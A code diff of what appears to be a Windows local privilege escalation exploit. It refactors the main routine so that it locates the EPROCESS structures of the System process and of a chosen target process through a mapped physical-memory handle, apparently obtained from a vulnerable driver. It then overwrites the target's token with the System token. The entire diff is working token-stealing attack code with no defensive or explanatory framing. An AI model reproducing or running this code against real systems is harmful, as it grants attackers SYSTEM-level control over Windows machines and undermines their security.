@@ -122,20 +122,22 @@ int main(int argc, char** argv)
 	if (buf == 0) {
 		exit(EXIT_FAILURE);
 	}
-	const int EPROCESS_SYSTEM_size = 50;
-	unsigned __int64 EPROCESS_SYSTEM[EPROCESS_SYSTEM_size]; // 50 should be enough
+	int EPROCESS_SYSTEM_size = 0;
+	int EPROCESS_target_size = 0;
+	unsigned __int64 EPROCESS_SYSTEM[50]; // 50 should be enough
+	unsigned __int64 EPROCESS_target[50];
 
 
 	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
-	int occurrences_system = GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM, EPROCESS_SYSTEM_size);
-	if (occurrences_system == -1)
+	int res = GetTwoEPROCESSPhysicalBase("System" ,procName.c_str(), 4, procId, hPhysicalMemory, EPROCESS_SYSTEM, EPROCESS_target, &EPROCESS_SYSTEM_size, &EPROCESS_target_size);
+	if (res == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
 	unsigned __int64 systemToken = 0;
 
-	for (int i = 0; i < occurrences_system; i++) {
+	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
@@ -153,26 +155,15 @@ int main(int argc, char** argv)
 		}
 	}
 
-	printf("----------------------------------------------- now for %s\n", procName.c_str());
-
-	const int EPROCESS_cmd_size = 50;
-	unsigned __int64 EPROCESS_cmd[EPROCESS_cmd_size];
-	int occurrences_cmd = GetEPROCESSPhysicalBase(procName.c_str(), procId, hPhysicalMemory, EPROCESS_cmd, EPROCESS_cmd_size);
-	if (occurrences_cmd == -1)
-	{
-		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
-	}
-
-
-	for (size_t i = 0; i < occurrences_cmd; i++) {
-		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_cmd[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
+	for (size_t i = 0; i < EPROCESS_target_size; i++) {
+		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_target[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
 		}
 
 		// print Token for each EPROCESS Base
 		PVOID castedBuf = *buf;
-		castedBuf = (unsigned char*)castedBuf + (EPROCESS_cmd[i] & (unsigned __int64)-1 & 0xFFF);
+		castedBuf = (unsigned char*)castedBuf + (EPROCESS_target[i] & (unsigned __int64)-1 & 0xFFF);
 		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
 		*(unsigned __int64*)castedBuf = systemToken; // this should do it
 		
